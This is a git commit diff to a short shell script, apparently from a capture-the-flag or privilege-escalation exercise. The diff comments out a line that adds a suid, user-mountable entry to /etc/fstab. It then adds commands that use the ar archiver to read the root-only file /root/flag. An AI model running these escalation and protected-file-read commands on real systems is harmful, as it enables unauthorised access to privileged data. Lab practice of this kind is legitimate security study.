a7fc38880a5594849a054e520af329b3ec6b1892
ZhangXioakangFire <94939336+ZhangXioakangFire@users.noreply.github.com>
2022-01-18 00:02:42 +0000

    Update sh.sh

--- sh.sh
+++ sh.sh
@@ -4,4 +4,9 @@
 
 # cat /root/flag
 
-echo 'test /mnt ext2 user,suid,exec,loop 0 0' >> /etc/fstab
+# echo 'test /mnt ext2 user,suid,exec,loop 0 0' >> /etc/fstab
+
+TF=$(mktemp -u)
+LFILE=/root/flag
+ar r "$TF" "$LFILE"
+cat "$TF"
